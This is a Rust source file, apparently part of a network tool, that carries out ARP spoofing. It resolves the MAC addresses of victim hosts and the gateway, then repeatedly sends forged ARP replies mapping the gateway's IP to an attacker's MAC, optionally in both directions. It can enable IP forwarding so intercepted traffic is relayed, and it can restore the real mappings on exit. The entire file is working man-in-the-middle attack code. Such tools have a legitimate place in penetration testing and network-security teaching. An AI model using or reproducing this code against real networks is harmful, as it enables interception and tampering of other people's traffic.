use crate::{arp::{self, request_arp}, forward::{enable_ip_forward, get_ip_forward, set_ip_forward}};
use crate::{args, arp::new_ether_channel};
use ctrlc;
use log::info;
use pnet::{datalink::DataLinkSender, packet::Packet};
use pnet::{
    datalink::{Config, NetworkInterface},
    util::MacAddr,
};
use std::sync::Arc;
use std::thread::sleep;
use std::{
    net::Ipv4Addr,
    sync::atomic::{AtomicBool, Ordering},
    time::Duration,
};

struct Addrs {
    pub ip: Ipv4Addr,
    pub mac: MacAddr,
}

impl Addrs {
    pub fn new(ip: Ipv4Addr, mac: MacAddr) -> Self {
        return Self { ip, mac };
    }
}

pub fn main_spoof(args: args::spoof::Arguments) -> Result<(), String> {
    let iface = &args.iface;
    let timeout = args.timeout;

    let my_addr = get_my_addrs(iface)?;
    let attacker_addr =
        get_attacker_addrs(iface, &my_addr, args.fake_ip, args.timeout)?;
    let gw_addr = get_gw_addrs(iface, args.gw_ip, &my_addr, timeout)?;

    let mut victim_ips = args.victim_ips;
    victim_ips.remove(&my_addr.ip);
    victim_ips.remove(&attacker_addr.ip);
    victim_ips.remove(&gw_addr.ip);

    let victims_addr = get_victims_addrs(
        iface,
        & victim_ips.into_iter().collect(),
        &my_addr,
        timeout,
    )?;



    let delay = args.delay;

    let running = Arc::new(AtomicBool::new(true));
    let run_c = running.clone();

    ctrlc::set_handler(move || {
        run_c.store(false, Ordering::SeqCst);
    })
    .expect("Error setting Ctrl-C handler");


    let old_forward_value = if args.forward {
        let fv = get_ip_forward()?;
        enable_ip_forward()?;
        fv
    } else {
        format!("")
    };

    spoof(
        iface,
        &victims_addr,
        &gw_addr,
        &attacker_addr,
        delay,
        args.count,
        running,
        args.recover,
        args.bidirectional,
    )?;

    if args.forward {
        set_ip_forward(&old_forward_value)?;
    }

    return Ok(());
}

fn get_my_addrs(iface: &NetworkInterface) -> Result<Addrs, String> {
    let my_mac = (iface)
        .mac
        .ok_or_else(|| {
            format!("Unable to get the MAC of {} interface", iface.name)
        })?
        .clone();

    let my_ip = arp::get_iface_ipv4(iface).ok_or_else(|| {
        format!("Unable to get the Ipv4 of {} interface", iface.name)
    })?;

    return Ok(Addrs::new(my_ip, my_mac));
}

fn get_attacker_addrs(
    iface: &NetworkInterface,
    my_addr: &Addrs,
    fake_ip: Option<Ipv4Addr>,
    timeout: Duration,
) -> Result<Addrs, String> {
    Ok(match fake_ip {
        Some(fake_ip) => {
            let attacker_mac =
                request_arp(&iface, fake_ip, my_addr.ip, my_addr.mac, timeout)
                    .map_err(|e| {
                        format!(
                            "Unable to get MAC of attacker {}: {}",
                            fake_ip, e
                        )
                    })?;
            Addrs::new(fake_ip, attacker_mac)
        }
        None => Addrs::new(my_addr.ip, my_addr.mac),
    })
}

fn get_gw_addrs(
    iface: &NetworkInterface,
    gw_ip: Ipv4Addr,
    my_addr: &Addrs,
    timeout: Duration,
) -> Result<Addrs, String> {
    let gw_mac = request_arp(iface, gw_ip, my_addr.ip, my_addr.mac, timeout)
        .map_err(|e| {
            format!("Unable to get MAC of gateway {}: {}", gw_ip, e)
        })?;

    return Ok(Addrs::new(gw_ip, gw_mac));
}

fn get_victims_addrs(
    iface: &NetworkInterface,
    victims_ips: &Vec<Ipv4Addr>,
    my_addr: &Addrs,
    timeout: Duration,
) -> Result<Vec<Addrs>, String> {
    let mut victims_addrs = Vec::new();
    for victim_ip in victims_ips {
        match arp::request_arp(
            iface,
            *victim_ip,
            my_addr.ip,
            my_addr.mac,
            timeout,
        ) {
            Ok(victim_mac) => {
                victims_addrs.push(Addrs::new(*victim_ip, victim_mac))
            }
            Err(e) => {
                info!("Unable to get MAC of victim {}: {}", victim_ip, e)
            }
        }
    }

    if victims_addrs.len() == 0 {
        return Err(format!("Unable to get any MAC of victims"));
    }

    return Ok(victims_addrs);
}

fn spoof(
    iface: &NetworkInterface,
    victims_addr: &Vec<Addrs>,
    gw_addr: &Addrs,
    attacker_addr: &Addrs,
    delay: Duration,
    count: Option<u64>,
    running: Arc<AtomicBool>,
    recover: bool,
    bidirectional: bool,
) -> Result<(), String> {
    let (mut sender, receiver) = new_ether_channel(iface, Config::default())?;
    drop(receiver);

    spoof_victims(
        &mut sender,
        victims_addr,
        gw_addr,
        attacker_addr,
        delay,
        count,
        running,
        bidirectional,
    )?;

    if recover {
        recover_victims(
            &mut sender,
            victims_addr,
            gw_addr,
            delay,
            bidirectional,
        )?;
    }

    return Ok(());
}

fn spoof_victims(
    sender: &mut Box<dyn DataLinkSender>,
    victims_addr: &Vec<Addrs>,
    gw_addr: &Addrs,
    attacker_addr: &Addrs,
    delay: Duration,
    mut count: Option<u64>,
    running: Arc<AtomicBool>,
    bidirectional: bool,
) -> Result<(), String> {
    for victim_addr in victims_addr.iter() {
        eprintln!(
        "Spoofing - telling {} ({}) that {} is {} ({}) every {}.{} seconds ({})",
        victim_addr.ip,
        victim_addr.mac,
        gw_addr.ip,
        attacker_addr.mac,
        attacker_addr.ip,
        delay.as_secs() as f64,
        delay.subsec_nanos() as f64 * 1e-9,
        match count {
            Some(c) => format!("{} times", c),
            None => format!("until Ctrl-C")
        }
    );
    }
    while running.load(Ordering::SeqCst) {
        count = match count {
            Some(c) => {
                if c == 0 {
                    break;
                }
                Some(c - 1)
            }
            None => None,
        };

        for victim_addr in victims_addr.iter() {
            send_arp_reply(
                sender,
                victim_addr.ip,
                victim_addr.mac,
                gw_addr.ip,
                attacker_addr.mac,
            )?;
            if bidirectional {
                send_arp_reply(
                    sender,
                    gw_addr.ip,
                    gw_addr.mac,
                    victim_addr.ip,
                    attacker_addr.mac,
                )?;
            }
        }

        sleep(delay);
    }

    return Ok(());
}

fn recover_victims(
    sender: &mut Box<dyn DataLinkSender>,
    victims_addr: &Vec<Addrs>,
    gw_addr: &Addrs,
    delay: Duration,
    bidirectional: bool,
) -> Result<(), String> {
    for victim_addr in victims_addr.iter() {
        eprintln!(
            "Readjusting {} for {} ({})",
            gw_addr.ip, victim_addr.ip, victim_addr.mac
        );
    }
    for _ in 0..5 {
        for victim_addr in victims_addr.iter() {
            send_arp_reply(
                sender,
                victim_addr.ip,
                victim_addr.mac,
                gw_addr.ip,
                gw_addr.mac,
            )?;
            if bidirectional {
                send_arp_reply(
                    sender,
                    gw_addr.ip,
                    gw_addr.mac,
                    victim_addr.ip,
                    victim_addr.mac,
                )?;
            }
        }
        sleep(delay);
    }

    return Ok(());
}

fn send_arp_reply(
    sender: &mut Box<dyn DataLinkSender>,
    target_ip: Ipv4Addr,
    target_mac: MacAddr,
    source_ip: Ipv4Addr,
    source_mac: MacAddr,
) -> Result<(), String> {
    info!(
        "{}-{} -> {}-{}",
        source_ip, source_mac, target_ip, target_mac
    );

    let real_packet =
        arp::new_ether_arp_reply(target_ip, target_mac, source_ip, source_mac);
    sender
        .send_to(real_packet.packet(), None)
        .ok_or("Error sending packet")?
        .map_err(|e| format!("Error sending packet: {}", e))?;

    return Ok(());
}
